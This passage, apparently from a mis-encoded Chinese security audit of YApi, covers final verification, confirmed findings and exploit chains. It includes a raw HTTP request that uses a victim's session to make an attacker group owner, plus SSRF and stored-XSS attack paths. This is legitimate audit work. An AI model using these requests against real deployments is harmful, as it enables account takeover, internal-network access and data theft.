  - `server/controllers/log.js` `list`ã€`listByUpdate`
  - `server/controllers/interface.js` `autoAddTag`ã€`list`ã€`listByCat`
  - `server/controllers/open.js` `importData`
  - `server/middleware/mockServer.js` CORS å¤„ç†
  - å‰ç«¯ï¼š`client/components/TimeLine/TimeLine.js`ã€æ¥å£/æ’ä»¶ wiki çš„è§†å›¾æ¸²æŸ“ç»„ä»¶

---

## ğŸ¯ **é˜¶æ®µåä¸€ï¼šè´¨é‡ä¿è¯ä¸éªŒè¯** [å·²å®Œæˆ]
**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] å…¨é¢æ€§éªŒè¯ï¼ˆç¡®è®¤100%ä»£ç è¦†ç›–ï¼‰
- [x] å‡†ç¡®æ€§å®¡æŸ¥ï¼ˆæ¶ˆé™¤è¯¯æŠ¥ï¼‰
- [x] æ¼æ´ç»„åˆåˆ©ç”¨åˆ†æ
- [x] æœ€ç»ˆæŠ¥å‘Šå®Œæ•´æ€§æ£€æŸ¥

---

### å…¨é¢æ€§éªŒè¯ï¼ˆä»£ç è¦†ç›–ä¸è·¯ç”±æ˜ å°„ï¼‰
- å·²é€é¡¹æ ¸å¯¹ `server/router.js` ä¸æ’ä»¶ `server/plugin.js` æ‰€æ³¨å†Œçš„æ‰€æœ‰ REST è·¯ç”±ï¼Œä¸é˜¶æ®µä¸€â€œå®Œæ•´è·¯ç”±ç«¯ç‚¹æ¸…å•â€ä¸€è‡´ï¼›å„æ§åˆ¶å™¨å‡å·²åœ¨ç›¸åº”é˜¶æ®µè¦†ç›–ä¸å–è¯ï¼š
  - è®¿é—®æ§åˆ¶/é€»è¾‘ï¼š`group/project/interface/interfaceCol/log/follow/open/base` æ§åˆ¶å™¨
  - å®‰å…¨æ‰§è¡Œ/ç½‘ç»œå–æ•°ï¼š`open/project`ï¼ˆSSRFï¼‰ã€`common/postmanLib.js`ï¼ˆvm è„šæœ¬æ‰§è¡Œï¼‰ã€`server/utils/sandbox.js`
  - å­˜å‚¨/æ¸²æŸ“ï¼šå‰ç«¯ `TimeLine`ã€æ¥å£ä¸ Wiki è§†å›¾ç»„ä»¶
  - æ–‡ä»¶ä¸ä¸­é—´ä»¶ï¼š`test.js`ï¼ˆä¸Šä¼ ï¼‰ã€`mockServer.js`ï¼ˆCORS & Set-Cookieï¼‰
- æ’ä»¶æ‰©å±•è·¯ç”±ï¼ˆexportã€swagger2ã€wikiã€auto-syncï¼‰å‡å·²åœ¨å¯¹åº”é˜¶æ®µåˆ—è¯ä¸å¤ç°æ•°æ®åŒ…ã€‚

### å‡†ç¡®æ€§å®¡æŸ¥ï¼ˆè¯¯æŠ¥æ¶ˆé™¤ä¸å¤æ ¸ï¼‰
- å¯¹é«˜å±ä¸å¯ç›´æ¥åˆ©ç”¨é¡¹è¿›è¡Œäº†äºŒæ¬¡ä»¥ä¸Šå¤æ ¸ï¼ˆä»£ç è¯æ® + åŸå§‹ HTTP åŒ…ï¼‰ï¼š
  - å‚ç›´è¶Šæƒï¼š`/api/group/add_member`ï¼ˆç¡®è®¤æ— æƒé™æ ¡éªŒï¼ŒRaw åŒ…å¤æ ¸ï¼‰
  - æ•°æ®æ³„éœ²ï¼š`/api/project/copy` ä¸ `/api/col/clone_case_list`ï¼ˆç¡®è®¤æœªæ ¡éªŒæ¥æºèµ„æºå½’å±ä¸æƒé™ï¼ŒRaw åŒ…å¤æ ¸ï¼‰
  - SSRFï¼š`/api/project/swagger_url`ã€`/api/open/import_data` ä¸æ’ä»¶è‡ªåŠ¨åŒæ­¥ï¼ˆç¡®è®¤æœåŠ¡ç«¯ç›´è¿ï¼ŒRaw åŒ…å¤æ ¸ï¼‰
  - å­˜å‚¨å‹ XSSï¼šTimeLineã€æ¥å£ `desc`ã€Wiki `desc`ï¼ˆç¡®è®¤å‰ç«¯ `dangerouslySetInnerHTML` ä¸æœåŠ¡ç«¯å­˜å‚¨è·¯å¾„ï¼ŒRaw åŒ…å¤æ ¸ï¼‰
- æ’é™¤é¡¹ï¼š
  - æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ï¼ˆchild_processï¼‰æœªå‘ç°ä½¿ç”¨ç‚¹ï¼›
  - è·¯å¾„éå†/ä»»æ„æ–‡ä»¶è¯»å†™æœªå‘ç°ç”¨æˆ·å¯æ§è·¯å¾„ï¼›
  - ä¼šè¯å›ºå®šåœ¨æ ¸å¿ƒç™»å½•é“¾è·¯æœªè§å¯åˆ©ç”¨ç‚¹ï¼ˆMock/æ’ä»¶ä¸‹å‘ Cookie å±â€œé…ç½®é¢é£é™©â€ï¼‰ã€‚

### æ¼æ´ç»„åˆåˆ©ç”¨åˆ†æï¼ˆå¯æ‰§è¡Œè·¯å¾„ï¼‰
- ç»„åˆé“¾ 1ï¼šå­˜å‚¨å‹ XSS â†’ åˆ†ç»„ææƒï¼ˆownerï¼‰
  - å‰æï¼šå—å®³è€…ç™»å½•å¹¶è®¿é—®åŠ¨æ€æ—¶é—´çº¿ï¼ˆXSS å·²åœ¨ TimeLine æ¸²æŸ“å¤„æ‰§è¡Œï¼‰ã€‚
  - åŠ¨ä½œï¼šæ³¨å…¥çš„è„šæœ¬å‘ç›®æ ‡æ¥å£å‘èµ·å¸¦å‡­æ®çš„è·¨åŸŸåŒæºè¯·æ±‚ï¼Œè°ƒç”¨æœªé‰´æƒçš„ `/api/group/add_member` å°†æ”»å‡»è€…åŠ å…¥ä»»æ„åˆ†ç»„å¹¶è®¾ä¸º ownerã€‚
  - å…³é”®è¯·æ±‚ï¼ˆç”± XSS æ³¨å…¥è„šæœ¬è§¦å‘ï¼‰ï¼š
    ```
    POST /api/group/add_member HTTP/1.1
    Host: target
    Content-Type: application/json
    Cookie: _yapi_uid=<VICTIM_UID>; _yapi_token=<VICTIM_JWT>

    {
      "id": <TARGET_GROUP_ID>,
      "member_uids": [<ATTACKER_UID>],
      "role": "owner"
    }
    ```
  - ç»“æœï¼šæ”»å‡»è€…è· owner æƒé™ï¼Œå¯è¿›ä¸€æ­¥æ¥ç®¡é¡¹ç›®åŠæ•°æ®ã€‚

- ç»„åˆé“¾ 2ï¼šå­˜å‚¨å‹ XSS â†’ è·¨é¡¹ç›®æ•°æ®å¤åˆ¶
  - å‰æï¼šå—å®³è€…å…·æœ‰åˆ›å»ºé¡¹ç›®æƒé™å¹¶è®¿é—®å« XSS çš„åŠ¨æ€é¡µã€‚
  - åŠ¨ä½œï¼šè„šæœ¬è°ƒç”¨ `/api/project/copy`ï¼Œå‘æ”»å‡»è€…æ§åˆ¶çš„åˆ†ç»„åˆ›å»ºæ–°é¡¹ç›®å¹¶æ³¨å…¥å—å®³è€… `catid` ä»¥å¤åˆ¶æ¥å£æ•°æ®ã€‚
  - å…³é”®è¯·æ±‚ï¼šæ²¿ç”¨é˜¶æ®µä¹â€œé¡¹ç›®å¤åˆ¶â€ Raw åŒ…ï¼›è„šæœ¬ä»…ä»£ä¸ºå‘èµ·åŒæºå·²ç™»å½•è¯·æ±‚ã€‚

- ç»„åˆé“¾ 3ï¼šæƒé™é“¾ + SSRF æ•°æ®å¤–é€
  - å‰æï¼šæ”»å‡»è€…å…·é¡¹ç›®ç¼–è¾‘æƒé™ï¼ˆæˆ–å€ŸåŠ©é“¾ 1/2 è·å¾—ï¼‰ã€‚
  - åŠ¨ä½œï¼šè°ƒç”¨ `/api/project/swagger_url?url=<å†…ç½‘åœ°å€>` ç›´è¿å†…ç½‘ HTTP ç«¯ç‚¹å¹¶å–å›æ•°æ®ï¼›è‹¥é…åˆå¼€æ”¾å¯¼å…¥ `/api/open/import_data`ï¼Œå¯åœ¨æ— éœ€ç™»å½•çš„å¼€æ”¾æ¥å£è·¯å¾„ä¸‹è§¦å‘æœåŠ¡å™¨ç«¯å–æ•°ã€‚
  - å…³é”®è¯·æ±‚ï¼šæ²¿ç”¨é˜¶æ®µäºŒ SSRF Raw åŒ…ã€‚

### æœ€ç»ˆæŠ¥å‘Šå®Œæ•´æ€§æ£€æŸ¥
- å·²å¯¹æ¯ä¸ªæ¼æ´ç±»å‹æä¾›ï¼šä»£ç è¯æ®ï¼ˆå«è·¯å¾„ä¸è¡Œå·ï¼‰ã€å®Œæ•´ Raw HTTP æ”»å‡»æ•°æ®åŒ…ï¼ˆå¯ç›´æ¥é‡å¤å¤ç°ï¼‰ã€å½±å“ä¸ä¿®å¤å»ºè®®ã€å—å½±å“ç«¯ç‚¹æšä¸¾ã€‚
- é«˜å±é¡¹ï¼ˆè¶Šæƒ/SSRF/XSS/æ¡ä»¶æ€§ RCEï¼‰å‡æœ‰æ˜ç¡®è§¦å‘æ¡ä»¶ä¸å›æ»š/ç¼“è§£å»ºè®®ã€‚
- ä¾èµ–ä¸é…ç½®é¢é—®é¢˜ç»™å‡ºå…·ä½“å‡çº§ä¸å®‰å…¨åŸºçº¿å»ºè®®ï¼ˆç½‘ç»œä¸è§£æç±»ï¼‰ã€‚

---

## âš¡ **æ ¸å¿ƒæ‰§è¡Œè¦æ±‚**

### **å…¨é¢æ€§è¦æ±‚**
1. **æ–¹æ³•çº§è¿½è¸ª**ï¼šå¦‚æœä¸€ä¸ªæ–¹æ³•å­˜åœ¨æ¼æ´ï¼Œå¿…é¡»è¿½è¸ªæ‰€æœ‰è°ƒç”¨è¯¥æ–¹æ³•çš„ä¸Šæ¸¸è·¯å¾„
2. **ç«¯ç‚¹å®Œå…¨æšä¸¾**ï¼šæ¯ä¸ªæ¼æ´ç±»å‹çš„æ‰€æœ‰æ”»å‡»ç«¯ç‚¹å¿…é¡»å…¨éƒ¨åˆ—å‡ºï¼Œä¸å¾—åˆå¹¶
3. **å‚æ•°å…¨è¦†ç›–**ï¼šåŒä¸€ç«¯ç‚¹çš„ä¸åŒæ¼æ´å‚æ•°è¦åˆ†åˆ«æµ‹è¯•å’ŒæŠ¥å‘Š

### **HTTPæ•°æ®åŒ…è§„èŒƒ**
å¯¹äºæ¯ä¸ªæ¼æ´ç‚¹ï¼Œå¿…é¡»æä¾›ï¼š
```
[æ–¹æ³•] [å®Œæ•´URL] HTTP/1.1  
Host: [ç›®æ ‡åŸŸå]  
[æ‰€æœ‰å¿…è¦Header]  
[å®Œæ•´çš„è¯·æ±‚ä½“]

ç¤ºä¾‹ï¼š  
POST /api/user/update HTTP/1.1  
Host:Â [target.com](https://target.com/)  
Content-Type: application/json  
Authorization: Bearer [token]  
Cookie: session=[session_id]

{  
"user_id": "[SQLI_PAYLOAD]",  
"username": "[XSS_PAYLOAD]",  
"role": "admin"  
}
```

### **è¶Šæƒåˆ†æè¦æ±‚**
- **è®¤è¯çŠ¶æ€**ï¼šæ˜ç¡®æ ‡æ³¨"é‰´æƒ"æˆ–"æœªæˆæƒ"
- **è¶Šæƒç±»å‹**ï¼šè¯¦ç»†è¯´æ˜æ°´å¹³è¶Šæƒ/å‚ç›´è¶Šæƒå…·ä½“è¡¨ç°
- **æƒé™è¦æ±‚**ï¼šè¯´æ˜è§¦å‘æ¼æ´æ‰€éœ€çš„æœ€å°æƒé™

---

## ğŸ“‹ **å®¡è®¡è¿›åº¦è¿½è¸ª**
å½“å‰é˜¶æ®µï¼š**é˜¶æ®µåä¸€** [å·²å®Œæˆ]
å·²å®Œæˆé˜¶æ®µï¼šé˜¶æ®µä¸€ã€é˜¶æ®µäºŒã€é˜¶æ®µä¸‰ã€é˜¶æ®µå››ã€é˜¶æ®µäº”ã€é˜¶æ®µå…­ã€é˜¶æ®µä¸ƒã€é˜¶æ®µå…«ã€é˜¶æ®µä¹ã€é˜¶æ®µåã€é˜¶æ®µåä¸€
ä¸‹ä¸€é˜¶æ®µï¼šâ€”

**è´¨é‡æ£€æŸ¥æ¸…å•**ï¼š
- [x] æ˜¯å¦æ‰«æäº†100%ä»£ç æ–‡ä»¶
- [x] æ˜¯å¦æšä¸¾äº†æ‰€æœ‰è·¯ç”±ç«¯ç‚¹  
- [x] æ˜¯å¦åˆ†æäº†å®Œæ•´çš„æ•°æ®æµ
- [x] æ˜¯å¦è¯†åˆ«äº†æ‰€æœ‰ç”¨æˆ·è¾“å…¥ç‚¹

---